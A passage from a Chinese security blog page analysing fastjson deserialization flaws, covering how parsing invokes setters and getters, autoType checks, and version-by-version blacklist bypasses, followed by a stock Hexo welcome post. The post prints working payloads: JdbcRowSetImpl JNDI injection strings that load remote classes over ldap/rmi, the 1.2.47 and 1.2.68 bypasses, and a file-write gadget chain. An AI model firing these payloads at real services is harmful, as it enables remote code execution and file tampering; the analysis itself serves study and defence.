<p>其中第1，2种方式最终都会调用位于com.alibaba.fastjson.util.JavaBeanInfo.java中的JavaBeanInfo.build()方法来获取并保存目标Java类中的成员变量以及其对应的setter、getter<br><img src="/2022/02/21/fastjson/fastjson-1.png" alt="parse(左图)和parseObject(右图)的调用链"><br>二者后面的调用链是一样的，不同点在于JavaBeanInfo的clazz参数的来源不同<br>JSON.Parse(jsonstr)的clazz参数来源于jsonstr中的@type字段值；而JSON.parseObject的clazz参数来源于第二个参数Test.class，当@type字段值和test.class类名一致，则两者执行过程和结果是一致的</p>
<h3 id="2）使用结果"><a href="#2）使用结果" class="headerlink" title="2）使用结果"></a>2）使用结果</h3><p>第1、2种方式会在反序列化过程中调用setter方法以及getter方法，需要满足的条件如下（见JavaBeanInfo.build()方法源码）：<br>setter方法条件：<br>1、函数名长度大于4且以set开头<br>2、非静态函数<br>3、返回类型为void或当前类<br>4、参数个数为1个</p>
<p>getter方法条件：<br>1、方法名需要长于4<br>2、不是静态方法<br>3、以get字符串开头，且第四个字符需要是大写字母<br>4、方法不能有参数传入<br>5、继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong<br>6、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）</p>
<p>第3种方式会调用所有的getter和setter方法（非私有属性），其源码如下：<br><img src="/2022/02/21/fastjson/fastjson-2.png" alt="parseObject函数源码"><br>就是执行了parse，随后将返回的Java对象通过JSON.toJSON（）转为JSONObject对象，JSON.toJSON()方法会将目标类中所有getter方法记录下来并随后通过反射依次调用目标类中所有的getter方法<br>​tips：若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行</p>
<h2 id="3、漏洞触发"><a href="#3、漏洞触发" class="headerlink" title="3、漏洞触发"></a>3、漏洞触发</h2><p>​在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发</p>
<h2 id="4、fastjson时间线"><a href="#4、fastjson时间线" class="headerlink" title="4、fastjson时间线"></a>4、fastjson时间线</h2><p><img src="/2022/02/21/fastjson/fastjson-3.png" alt="fastjson时间线"></p>
<p>在autotype开启的情况下才能根据@type字段值去反序列化指定的类，在jvm启动参数中添加如下参数来开启</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfastjson.parser.autoTypeSupport=true</span><br></pre></td></tr></table></figure>
<p>即使开了autoType也需要经过checkAutoType黑名单检测，白名单是直接加载，但默认白名单为空</p>
<p>fastjson的poc主要分成3部分：</p>
<h3 id="1）1-22-22-1-2-45"><a href="#1）1-22-22-1-2-45" class="headerlink" title="1）1.22.22-1.2.45"></a>1）1.22.22-1.2.45</h3><pre><code>这期间主要是1.2.24的poc，以及对补丁黑名单的绕过
</code></pre>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nice0e3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//               String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/refObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;   <span class="comment">//1.2.41绕过</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;   <span class="comment">// 1.2.42绕过</span></span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2）1-2-47"><a href="#2）1-2-47" class="headerlink" title="2）1.2.47"></a>2）1.2.47</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;]</span><br></pre></td></tr></table></figure>
<p>​    使用java.lang.class将com.sun.rowset.JdbcRowSetImpl加入到白名单中来绕过黑名单检测</p>
<h3 id="3）1-2-68"><a href="#3）1-2-68" class="headerlink" title="3）1.2.68"></a>3）1.2.68</h3><p>​    fastjson 1.2.68 更新了一个新的安全机制 safeMode，在开启的情况下 checkAutoType 方法会直接抛出异常。连绕过的机会都不给了，而且在陆陆续续的版本更迭 checkAutoType 方法的代码也更新了许多但是逻辑基本没变<br>​    但是被爆出在开启 AutoType 和 不开启 safeMode 的情况下可以通过 expectClass 绕过 AutoType，恶意类evil加载完成后会判断一次加载的类是否为 java.lang.AutoCloseable的子类，如果是的话才会 return clazz。这也是为啥我们构造的 Evil 里需要继承 java.lang.AutoCloseable</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Evil&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>​    写文件的payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;stream&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">        <span class="string">&quot;targetPath&quot;</span>: <span class="string">&quot;f:/test/pwn.txt&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tempPath&quot;</span>: <span class="string">&quot;f:/test/test.txt&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;writer&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span>,</span><br><span class="line">        <span class="string">&quot;buffer&quot;</span>: <span class="string">&quot;文件内容 base64 编码&quot;</span>,</span><br><span class="line">        <span class="string">&quot;outputStream&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.stream&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;position&quot;</span>: <span class="number">5</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;close&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span>,</span><br><span class="line">        <span class="string">&quot;out&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;$ref&quot;</span>: <span class="string">&quot;$.writer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5、jdk版本更新"><a href="#5、jdk版本更新" class="headerlink" title="5、jdk版本更新"></a>5、jdk版本更新</h3><p>即使成功调用了了lookup函数，也需要注意java版本是否支持加载远程类，jndi lookup的具体实现是在jdk中实现，即使fastjson调用了lookup函数，也需要看看java版本是否支持远程加载，具体版本关系如下：<br><img src="/2022/02/21/fastjson/fastjson-4.png" alt="jdk时间线"></p>
<h3 id="6、参考链接："><a href="#6、参考链接：" class="headerlink" title="6、参考链接："></a>6、参考链接：</h3><p><a target="_blank" rel="noopener" href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a><br><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14776043.html#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6">https://www.cnblogs.com/nice0e3/p/14776043.html#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-hello-world"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/02/20/hello-world/"
    >Hello World</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/02/20/hello-world/" class="article-date">
  <time datetime="2022-02-20T07:43:19.258Z" itemprop="datePublished">2022-02-20</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

   
    
</article>

    
  </article>
  

  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2022
        <i class="ri-heart-fill heart_icon"></i> CrossTime
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/crosstime.png" alt="CrossTime的个人博客"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->
 
<script src="/js/clickLove.js"></script>
 
<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>